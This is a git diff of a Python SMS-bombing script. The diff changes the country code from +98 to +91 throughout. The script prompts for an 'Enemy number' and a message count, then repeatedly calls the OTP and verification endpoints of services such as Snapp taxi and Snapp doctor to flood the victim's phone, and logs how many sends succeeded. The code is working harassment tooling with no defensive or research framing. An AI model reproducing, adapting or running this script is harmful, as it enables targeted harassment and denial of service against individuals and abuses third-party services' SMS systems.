@@ -60,7 +60,7 @@ def log(looping_count, sms_number, phone_number):
     return_internet_error = str(sended.count(-1))
 
     print("----------------------------------------------------")
-    print("[-] target : 98 {}".format(phone_number))
+    print("[-] target : 91 {}".format(phone_number))
     print("\n\n[*] send: {}/{}    site error: {}    internet error: {}".format(return_200, sms_number, return_error, return_internet_error))
     print("\n[*] all lo0ping script : {}".format(looping_count))
     print("----------------------------------------------------")
@@ -75,7 +75,7 @@ def start():
     # input data
     logo()
     print("\n\n")
-    phone_number = str(input("[ ] Enemy number:\n>>+98 "))
+    phone_number = str(input("[ ] Enemy number:\n>>+91 "))
     sms_number = int(input("[ ] Number of sms:\n>>"))
     #sleep_number = int(input("[ ] Number of sms sent per second:\n>>"))
 
@@ -84,7 +84,7 @@ def start():
         if sended.count(1) >= sms_number:
             clear()
             log(looping_count, sms_number, phone_number)
-            print("\n[ ] Done, I sent more than {} sms to +98 {}\n".format(sms_number, phone_number ))
+            print("\n[ ] Done, I sent more than {} sms to +91 {}\n".format(sms_number, phone_number ))
             break
         
         else:
@@ -136,7 +136,7 @@ def start():
 # 001 snap
 def snap(phone_number):
     try:
-        phone_number = "+98" + phone_number
+        phone_number = "+91" + phone_number
         data = {"cellphone":phone_number}
         url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
         p = post(url, json=data, timeout=2)
@@ -305,7 +305,7 @@ def anten(phone_number):
 # 009 snap doctor *
 def snap_doctor(phone_number):
     try:
-        url = "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0{}/sms?cCode=+98)".format(phone_number)
+        url = "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0{}/sms?cCode=+91)".format(phone_number)
         p = get(url, timeout=3)
         rp = p.json()
         rp = rp["result"]
